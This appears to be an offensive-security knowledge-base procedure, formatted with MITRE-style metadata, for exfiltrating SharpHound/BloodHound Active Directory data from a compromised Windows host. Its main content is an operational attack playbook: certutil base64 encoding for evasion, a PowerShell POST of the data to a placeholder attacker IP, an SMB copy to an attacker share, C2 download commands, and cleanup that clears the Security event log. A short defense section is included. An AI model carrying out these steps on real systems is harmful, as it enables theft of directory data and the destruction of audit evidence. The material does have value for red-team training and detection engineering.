---
id: 26e892b4-b999-465a-b162-c0dd93ccafd0
type: procedure
description: >-
  Outlines multiple methods to exfiltrate SharpHound bloodhound collection
  results from a compromised Windows host, including file transfers, covert
  channels, encoding, and C2 integration.
verified: true
submitted: false
created_at: '2023-02-19T05:51:16.045851Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Exfiltration]]'
techniques:
  - '[[Exfiltration Over Command and Control Channel]]'
  - '[[Exfiltration Over Web Service]]'
  - '[[Automated Exfiltration]]'
sub_techniques:
  - '[[T1041.001]]'
  - '[[Exfiltration to Cloud Storage]]'
tags:
  - exfiltration
  - windows
  - sharphound
  - bloodhound
  - covert-channel
commands:
  - '[[commands/certutil-encode-file-to-base64]]'
  - '[[commands/powershell-invoke-webrequest-upload]]'
  - '[[commands/smb-copy-file-to-remote-share]]'
platforms:
  - Windows
tools:
  - '[[tools/Certutil]]'
  - '[[tools/Powershell]]'
validated: true
---

# Exfiltrate-SharpHound-Results-from-Windows-Host

## Summary

This procedure provides step-by-step guidance for exfiltrating SharpHound scan results (e.g., .zip files containing Active Directory enumeration data) from a compromised Windows host to an attacker-controlled system. It covers common techniques such as direct file transfers via SMB, encoding to evade detection followed by HTTP uploads, and integration with C2 channels, emphasizing stealth considerations like transfer size limits, network protocol mimicry, and resuming interrupted transfers for large files.

## Description

SharpHound is a data collector for BloodHound, used to map Active Directory relationships. After running SharpHound on a domain-joined Windows host, attackers must exfiltrate the resulting JSON or ZIP files without triggering alerts. This procedure assumes the attacker has local execution access (e.g., via initial access or lateral movement) and focuses on Windows-native tools to 'live off the land' where possible. Methods include:
- **File transfers**: Using built-in protocols like SMB or FTP for direct copy.
- **Covert channels**: Encoding data and tunneling over HTTP/DNS to blend with normal traffic.
- **Encoding**: Base64 or hex to obfuscate payloads.
- **C2 integration**: Leveraging established beacons (e.g., in Cobalt Strike) for seamless exfil.

Considerations for large files (>100MB): Use chunking, scheduled tasks for off-hours transfer, or hibernation-aware resuming. Target environments include enterprise networks with EDR, where outbound traffic to common ports (80/443) is less suspicious. Success relies on mimicking legitimate traffic (e.g., TLS encryption) and avoiding known IOCs like unusual DNS queries.

## Requirements

1. Local administrator or user-level access on a domain-joined Windows host (10/11/Server 2016+).
2. SharpHound output file (e.g., `bloodhound.zip`) in a accessible path like `%TEMP%`.
3. Network access to attacker-controlled endpoint (e.g., HTTP server on port 80/443 or SMB share).
4. For C2 methods: An active implant or beacon (e.g., via Empire or Cobalt Strike).
5. Optional: Proxy or VPN for pivoting if direct outbound is blocked.

## Defense

- Monitor outbound network traffic for anomalous volumes or protocols (e.g., large SMB/HTTP POSTs to unknown IPs) using NDR tools like Zeek or Splunk.
- Enable EDR logging for process execution (e.g., certutil.exe, powershell.exe) and file staging in temp directories.
- Implement DLP policies to scan for encoded data (base64 patterns) and block uploads to unapproved cloud services.
- Use application whitelisting to restrict LOLBAS like certutil and PowerShell scripting.
- For C2: Behavioral analytics to detect beaconing patterns (e.g., periodic DNS queries).

## Objectives

1. Transfer SharpHound results to attacker control without detection.
2. Maintain operational stealth by encoding data and using common protocols.
3. Handle interruptions for large transfers via resumable methods or scheduling.
4. Verify successful exfil and decode data on the receiving end.

## Instructions

### Step 1: Prepare and Encode the File

**Context**: Before transfer, encode the SharpHound ZIP file using base64 to evade signature-based detection and reduce suspicion during transit. This step uses the built-in certutil tool, a common LOLBAS for encoding without dropping new binaries.

**Command** ([[commands/certutil-encode-file-to-base64]]):
```cmd
certutil -encode %TEMP%\bloodhound.zip %TEMP%\encoded.txt
```

> This command reads the input ZIP file and outputs a base64-encoded text file. The encoding wraps the binary data in MIME format, which can be stripped later. Run from an elevated command prompt to avoid access issues. If the file is large, monitor disk I/O to avoid alerts.

**Expected Output**: A new file `encoded.txt` containing base64 data, e.g., starting with `-----BEGIN CERTIFICATE-----` followed by the encoded payload.

### Step 2: Exfiltrate via HTTP Upload

**Context**: For networks allowing outbound HTTP, upload the encoded file using PowerShell's Invoke-WebRequest. This mimics legitimate web traffic and supports TLS for encryption. Set up an attacker-controlled HTTP server (e.g., Python SimpleHTTPServer) to receive the POST.

**Command** ([[commands/powershell-invoke-webrequest-upload]]):
```powershell
Invoke-WebRequest -Uri "http://$_ATTACKER_IP/upload.php" -Method POST -InFile "$env:TEMP\encoded.txt" -ContentType "application/octet-stream"
```

> Replace `$_ATTACKER_IP` with your listener IP. The `-InFile` parameter sends the file as the request body. For large files, add `-UseBasicParsing` to avoid IE dependencies and `-TimeoutSec 300` for resumability. If blocked, tunnel over DNS by chunking the data.

**Expected Output**: HTTP 200 OK response from the server, confirming receipt. No errors like 'Access Denied' or timeout.

### Step 3: Alternative - Transfer via SMB Share

**Context**: If HTTP is restricted, use SMB to copy to a controlled share on the network. This requires knowing a writable remote path and may trigger share access logs, so use only if SMB outbound is whitelisted.

**Command** ([[commands/smb-copy-file-to-remote-share]]):
```cmd
copy %TEMP%\bloodhound.zip \\_REMOTE_SHARE\incoming\bloodhound.zip
```

> `$_REMOTE_SHARE` is the UNC path to your controlled SMB server (e.g., `\\192.168.1.100\shared`). Authenticate if needed with `net use`. For stealth, stage in a legitimate-looking directory and use existing credentials.

**Expected Output**: File copied successfully, verifiable by listing the remote directory or checking file size/hash match.

### Step 4: Exfiltrate via C2 Channel (If Established)

**Context**: If a C2 framework is beaconing, use its built-in exfil module to download the file directly. This avoids custom commands and leverages encrypted channels.

**Instructions**: In tools like Cobalt Strike, issue a `download bloodhound.zip` beacon command. For Empire, use `usemodule collection/filecollector`. Monitor for transfer completion in the C2 console.

**Expected Output**: File appears in the C2 server's loot directory, with logs showing bytes transferred.

### Step 5: Verify and Clean Up

**Context**: Confirm receipt on the attacker side, decode if encoded, and remove traces on the host to maintain persistence.

**Instructions**: On attacker machine, decode with `certutil -decode encoded.txt bloodhound_decoded.zip`. Delete temp files: `del %TEMP%\bloodhound.zip %TEMP%\encoded.txt`. Clear event logs if possible using `wevtutil cl security`.

**Expected Output**: Decoded ZIP opens in BloodHound without corruption; no residual files on host.
